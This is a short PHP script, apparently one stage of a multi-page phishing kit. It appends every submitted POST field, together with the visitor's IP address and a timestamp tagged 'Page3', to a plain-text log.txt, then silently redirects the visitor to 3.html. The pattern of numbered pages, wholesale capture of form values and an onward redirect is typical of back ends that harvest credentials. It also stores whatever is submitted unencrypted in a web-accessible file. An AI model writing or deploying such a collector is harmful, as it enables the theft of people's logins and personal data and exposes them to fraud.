<?php 
    $handle = fopen('log.txt', 'a');

    fwrite($handle, '--------[Page3]------------------------['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n"); 
    foreach ($_POST as $variable => $value) {
        fwrite($handle, $variable.': '.$value."\r\n");
    }; 
    fclose($handle); 
    header('location: 3.html');
?>